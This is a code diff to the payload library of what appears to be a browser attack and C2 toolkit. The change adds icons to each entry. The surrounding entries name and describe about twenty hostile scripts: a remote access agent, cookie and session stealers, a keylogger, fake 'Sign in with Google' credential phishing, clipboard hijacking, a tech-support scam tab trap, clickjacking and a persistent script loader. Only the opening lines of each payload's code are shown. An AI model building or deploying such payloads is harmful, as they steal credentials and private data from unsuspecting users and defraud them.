@@ -1,10 +1,30 @@
 
-import type { JsPayload } from '@/components/javascript-library';
+import {
+    Bot,
+    CaseUpper,
+    Clipboard,
+    Cookie,
+    Download,
+    Eye,
+    FileInput,
+    Key,
+    Keyboard,
+    Lock,
+    MapPin,
+    Monitor,
+    MousePointer,
+    Network,
+    Scan,
+    History,
+    Radio
+} from 'lucide-react';
+import type { JsPayload } from '@/types';
 
 export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "WebRAT Agent",
         description: "Full-featured agent for the Remote Access Toolkit page. Enables screen sharing, remote shell, and file system access.",
+        icon: Radio,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -109,6 +129,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Cookie Stealer",
         description: "Grabs all non-HttpOnly cookies from the document and exfiltrates them.",
+        icon: Cookie,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -126,6 +147,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Keylogger",
         description: "Captures every key press on the page and exfiltrates it in real-time.",
+        icon: Keyboard,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -143,6 +165,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
         {
         name: "Form Submission Logger",
         description: "Intercepts all form submissions on the page and sends the captured data.",
+        icon: FileInput,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -161,6 +184,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "DOM Cloner",
         description: "Captures the entire current state of the page's HTML and sends it back.",
+        icon: CaseUpper,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -176,6 +200,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "WebRTC IP Leak",
         description: "Attempts to discover the user's local IP address using WebRTC.",
+        icon: Network,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -204,6 +229,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
      {
         name: "Session Data Hijacker",
         description: "Exfiltrates cookies, localStorage, and sessionStorage from the page.",
+        icon: Key,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -223,6 +249,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Geolocation Tracker",
         description: "Requests the user's high-accuracy location and sends the coordinates back.",
+        icon: MapPin,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -259,6 +286,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Full Recon Payload",
         description: "The default payload that captures keystrokes, clicks, and form submissions.",
+        icon: Monitor,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -293,6 +321,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Device Access & C2",
         description: "Requests webcam/mic access and listens for C2 commands.",
+        icon: Radio,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -458,6 +487,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Browser-in-the-Browser (BitB) Attack",
         description: "Simulates a fake login popup (e.g., 'Sign in with Google') to hijack credentials.",
+        icon: Lock,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -505,6 +535,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Internal Network Scanner",
         description: "Scans for common internal network IP addresses to identify potential devices.",
+        icon: Network,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -526,6 +557,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Port Scanner",
         description: "Performs a timing-based scan to infer open ports on a target.",
+        icon: Scan,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -555,6 +587,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Clipboard Hijacker",
         description: "Steals clipboard content on paste and can optionally overwrite it.",
+        icon: Clipboard,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -576,6 +609,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Drive-by Download",
         description: "Forces the browser to download a file created from a Blob.",
+        icon: Download,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -599,6 +633,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Fake System Alert / Tab Trap",
         description: "Simulates a tech support scam by trapping the user in alert loops.",
+        icon: History,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -619,6 +654,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Clickjacking Overlay",
         description: "Creates an invisible iframe to hijack user clicks.",
+        icon: Eye,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -640,6 +676,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Persistent Loader (localStorage)",
         description: "Injects a script from localStorage on every page load.",
+        icon: Key,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -662,6 +699,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Behavioral Biometrics",
         description: "Collects mouse movement and typing patterns.",
+        icon: Bot,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -693,6 +731,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Password Field Collector",
         description: "Specifically targets password fields to capture credentials as they are typed.",
+        icon: Key,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -714,6 +753,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     {
         name: "Saved Password Collector (Simulation)",
         description: "Simulates accessing saved credentials from a browser's password manager.",
+        icon: MousePointer,
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
